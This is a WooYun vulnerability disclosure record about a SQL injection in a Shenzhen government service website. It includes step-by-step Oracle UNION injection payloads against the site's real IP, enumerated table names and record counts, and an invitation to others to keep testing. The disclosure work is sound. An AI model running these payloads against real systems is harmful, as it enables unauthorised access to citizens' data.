{"id": 46527, "wybug_id": "wooyun-2015-0128168", "wybug_title": "深圳市行政服务大厅官网一处POST注入(Oracle Union纯手工测试技巧)", "wybug_corp": "深圳市行政服务大厅", "wybug_author": "goubuli", "wybug_date": "2015-07-21 17:34", "wybug_open_date": "2015-09-06 14:24", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "18", "wybug_status": "已交由第三方合作机构(广东省信息安全测评中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-21：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-23：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-08-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-08-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-08-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-06：\t细节向公众公开  简要描述： RT手工演示。。。 详细说明：  深圳市行政服务大厅网上办事系统的办事状态查询URL：\nhttp://61.144.227.35/main/gb/adminhall/szzwresult.jsp\nPOST:\nfield2=201502163000016\n输入任意数据的时候提示出错，回执编号可以在首页上面看到，如图：\n\n正常POST访问页面为：\n\n工具没跑出数据来。。。只能手工。。。。看截图：\n\n下面手工测试：判断数据库，在一番测试后最后判定是Oracle，判断数据：\nfield2=201502163000016' and  0<>(select count(*) from dual) --\n判断字段长度，提交：\nfield2=201502163000016' order by 17--\n页面正常。。。直接union，由于oracle的字段敏感性，类型必须一一对应，只能提交：\nfield2=201502163000016' UNION SELECT null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null from dual--\n页面正常紧接着判断字段，逐一排除，最终提交：\nfield2=201502163000016'  UNION SELECT '1','2','3','4','5','6','7','8','9',10,11,12,'13','14','15',null,'17' from dual--\n\n\n可用字段：1，5，9接下来就是直接Union的过程：1、看看版本：\nfield2=201502163000016'  UNION SELECT '11'||((select banner from sys.v_$version where rownum=1)),'2','3','4','5','6','7','8','9',10,11,12,'13','14','15',null,'17' from dual--\n\n\n2、看看当前连接用户名：\nfield2=201502163000016'  UNION SELECT '11'||((select SYS_CONTEXT ('USERENV', 'CURRENT_USER') from dual)),'2','3','4','5','6','7','8','9',10,11,12,'13','14','15',null,'17' from dual--\n3、判断操作系统\nfield2=201502163000016'  UNION SELECT '11'||((select member from v$logfile where rownum=1)),'2','3','4','5','6','7','8','9',10,11,12,'13','14','15',null,'17' from dual--\n结果：\nH:\\ORADATA\\SZGOV92\\REDO01.LOG\n是windows系统。。。4、表，一共有259张表：\nfield2=201502163000016' and (select count (*) from user_tables)=259 and 'kKTd'='kKTd\n\n\n5、表名：\nfield2=201502163000016'  UNION SELECT '11'||TABLE_NAME,'2','3','4','5','6','7','8','9',10,11,12,'13','14','15',null,'17' from (select A.*,rownum rn from (select * from USER_TABLES) A where rownum<2) where rn>0--\n第一张表：\nMEMBER_ACCOUNT\n其他表类似。。。写个程序跑出表，最后出来的表为（259张）：\nMEMBER_ACCOUNTMEMBER_ENTERPRISEMEMBER_MESSAGEARTICLESOURCEARTICLETOPICARTICLEUSERARTICLE_RELATE_WORDARTICLE_STATBANS_BANNERINFOBANS_GROUPBANS_STATEBBS_ARTICLEPROFILE_CATALOGPROFILE_MESSAGEPROFILE_NOTEBOOKPROFILE_SETTINGPROFILE_SYSTEMPROFILE_TYPEPROFILE_USERPROFILE_USER_MESSAGEPUBLISH_CATALOGRESOURCESRESOURCES_CONNECTIONRESOURCES_RELATERIGHTS_OBJECTSBBS_BANKBBS_BOARDBBS_USERCATALOG_FILE_OUTCATALOG_PAGECATALOG_PLUGINRIGHTS_OPTIONSRIGHTS_PERMISSIONSRIGHTS_ROLESRIGHTS_ROLE_OBJRIGHTS_ROLE_USERRIGHTS_USERSRIGHTS_USER_ACTIONTIMERIGHTS_USER_OBJRIGHTS_USER_SHARERIGHTS_USER_TRANSFERSERVICESETTINGSIGNSSIGN_TYPESITECATALOG_RELATIONSITE_MENUBARSITE_STATSITE_STATESITE_TEMPLATESITE_TEMPLATE_PROFILESITE_USERSTAT_DAYSTAT_FADDRESSSTAT_FAREASTAT_FBROWSERSTAT_FIPSTAT_FIPONESTAT_FIPTWOSTAT_FMOZILLASTAT_FREFERSTAT_FSCREENSTAT_FSYSTEMSTAT_FVISITSTAT_FWEBURLSTAT_INFOLISTSTAT_IPINFOSTAT_IPSCOPESTAT_MONTHSTAT_STATDAYSTAT_STATMONTHSTAT_STATWEEKSTAT_STATYEAREXCHANGE_TEMP_CKEXCHANGE_TEMP_DTFBXXEXCHANGE_TEMP_DWFEEDBACKFEEDBACK_TYPEHOMEPAGE_CATALOGHOT_CATALOGINQUIRY_ANSWER_COUNTINQUIRY_QUESTIONINQUIRY_QUESTION_ANSWERINQUIRY_QUESTION_TYPEINQUIRY_TOMEINQUIRY_TOME_QUESTIONINQUIRY_USERINQUIRY_USER_ANSWERINQUIRY_USER_ANSWER_BAKINQUIRY_USER_RESULTLAWLIBRARY_INFOSTYLELIBRARY_ITEMLIBRARY_TABLEINFOEXCHANGE_IN_HIST_EMAIL_DTFBXXEXCHANGE_IN_MYDDCWTEXCHANGE_IN_MYDDCXZSMEXCHANGE_IN_TEMP_CKEXCHANGE_IN_TEMP_CKSXEXCHANGE_IN_TEMP_DTFBXXEXCHANGE_IN_TEMP_DWEXCHANGE_IN_TEMP_EMAIL_BJZTEXCHANGE_IN_TEMP_EMAIL_DTFBXXEXCHANGE_LAWEXCHANGE_LAW_BAKEXCHANGE_LAW_CATALOGEXCHANGE_MYDDCXZSMEXCHANGE_ORGANIZATION_BAKEXCHANGE_RESOURCES_CONNECTIONEXCHANGE_TEMP_BLSXEXCHANGE_ORGANIZATIONYWTJXZXKBLJGLAW_NEWEXCHANGE_TEMP_BJZT_NEWEXCHANGE_TEMP_DTFBXX_NEWEXCHANGE_IN_TEMP_BJZT_0426EXCHANGE_IN_TEMP_BJZTDOCUMENTDOCUMENT_UPLOADEMAGAZINEEMAG_ARTICLEEMAG_COLUMNEMAG_ISSUEEMAG_ISSUE_COLUMNEVENTLOGEXCHANGE_DCDAEXCHANGE_DEALWUBINTEMP_TOTALCNTTEMP_IN_TOTALCNTEXCHANGE_DEAL_CATALOGEXCHANGE_FILEEXCHANGE_IN_DCDAEXCHANGE_IN_HIST_EMAIL_BJZTBBS_CATALOGBBS_IPBBS_KEYWORDBBS_NOTICEBBS_REPLY_MANBUILD_TEMPLATECASESCASE_REPLYCASE_TRADECASE_USERCATALOGCATALOG_FILECATALOG_USERCTDEALDECLARESDECLARE_STATEDICTIONARYDICTIONARY_TYPEARTICLEARTICLEFOLDERARTICLEKEYWORDARTICLEREADARTICLEREJECTARTICLEVIEWBANNER_TYPEBANS_BANNERSTATSBANS_DAYSTATSBANS_DEFAULT_BANNEREXCHANGE_TEMP_CKSXT_ERRORMSGUSER_DEPTUSER_DOC_SHAREUSER_GROUPUSER_GROUP_MEMBERUSER_ONLINEEXCHANGE_TEMP_BJZTTEMP1COMPLAINDEAL_TESTDEAL2EXCHANGE_IN_TEMP_BLSXSUGGESTION_ROLESUGGESTION_ZXWYSURVEYANSWERSSURVEYLOGSCOOKIESURVEYLOGSIPSURVEYQUESTIONSSURVEYQUESTIONS_KINDTAB_96666BOXTAB_DEPBRANCHTAB_DEPINFOTAB_DEPINFO2TAB_LEADERINFOTAB_STAFFINFOTAB_UP_BRANCHTEMPLATETEMPLATE_BAKTEMPLATE_CATALOGTEMPLATE_CATALOG_NOUSETEMPLATE_LIB_NOUSETEMPLATE_WEBPARTTOURIST_ARTICLEMEMBER_MESSAGE_OWNERMEMBER_PERSONMEMBER_PROFILEMEMBER_PROFILE_CATALOGMEMBER_SIGNUPMEMBER_TYPEMESSAGEMESSAGE_TYPENET_APPLYNET_ARTICLENET_ARTICLE_TYPENORMALINFO_LISTNORMALINFO_LISTTYPEONLINEUSEROPTION_REPLYOPTION_TITLEPHOTO_LIBPHOTO_TYPEPLAN_TABLEPLUGINPLUGIN_PROFILEPORTAL_USERPROCDESCRIPPROFILESTAT_VISITORSTAT_VISITTIMESTAT_WEEKSTAT_YEARSUGGESTIONSUGGESTION_AUTHDEPTCOMMENTSUGGESTION_CATAGORYSUGGESTION_CLERKINFOSUGGESTION_COMMISSARYSUGGESTION_COMMISSARYINFOSUGGESTION_DEPARTMENTINFOSUGGESTION_DEPARTMENTTYPESUGGESTION_FILETYPESUGGESTION_HISTORYSUGGESTION_RDDBEXCHANGE_MYDDCWTEXCHANGE_RESOURCES_CON_BAKLIBRARY_TYPELINKLINK_TYPELIVE_ARTICLELIVE_ROLELIVE_TOPICLIVE_WORDMAILBOX_ARTICLEMAILBOX_ARTICLE_OPERATORMAILBOX_FLOWMAILBOX_FLOW_OPERATORMAILBOX_FLOW_PROCESSMAILBOX_OPERATIONMAILBOX_RIGHTMAILBOX_TYPEMAILLISTMAILLISTMSGMAILLISTMSGHISMAILLISTSUBSCRIBE\n6、看看表里记录条数：\nfield2=201502163000016'  UNION SELECT '11'||count(*),'2','3','4','5','6','7','8','9',10,11,12,'13','14','15',null,'17' from INQUIRY_USER--\n\n\n\n5397条记录\n提交：\nfield2=201502163000016'  UNION SELECT '11'||count(*),'2','3','4','5','6','7','8','9',10,11,12,'13','14','15',null,'17' from EXCHANGE_IN_TEMP_BJZT--\n\n\n\n6313588条记录\n好了。。。到此吧其他信息不跑了。。。你们自己测吧。。。   漏洞证明：  \n\n\n\n\n\n\n\n\n\n声明：未做任何破坏性操作！   修复方案：  过滤参数加WAF   版权声明：转载请注明来源 goubuli@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-07-23 14:23 厂商回复： 非常感谢您的报告。报告中的问题已确认并复现.影响的数据：高攻击成本：低造成影响：高综合评级为：高，rank：10正在联系相关网站管理单位处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-07-21 17:34 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  手工注射吊吊的    \n     2015-07-21 18:47 |    \t\ttnt1200 \t\t\t( 普通白帽子  |\t\t\t        Rank:121 漏洞数:17        | 关注飞机安全....)\t\t \n  手工注射吊吊的    \n     2015-07-21 20:54 |    \t\tHackBraid  \t\t\t( 核心白帽子 |\t\t\t        Rank:1545 漏洞数:260        | ...........................................)\t\t \n  dba?    \n     2015-07-21 21:11 |    \t\tgoubuli \t\t\t( 普通白帽子  |\t\t\t        Rank:324 漏洞数:61        )\t\t \n  @tnt1200  tnt大牛    \n     2015-07-21 21:11 |    \t\tgoubuli \t\t\t( 普通白帽子  |\t\t\t        Rank:324 漏洞数:61        )\t\t \n  @HackBraid  没搞到shell    \n     2015-09-06 15:06 |    \t\t老实先生 \t\t\t( 路人 |\t\t\t        Rank:7 漏洞数:4        | 早日告别路人状态)\t\t \n  手工注射吊吊的     \n     2015-09-06 15:25 |    \t\t土夫子 \t\t\t( 普通白帽子  |\t\t\t        Rank:173 漏洞数:41        | 逆流而上，顺势而为)\t\t \n  @疯狗 狗哥求审 http://wooyun.org/bugs/wooyun-2015-0139280/trace/78141822290d425c0bc3b3a882103775    \n     2015-09-06 21:13 |    \t\tSoulmk \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:2        | 我是来学习滴~~)\t\t \n  手工注射吊吊的     \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}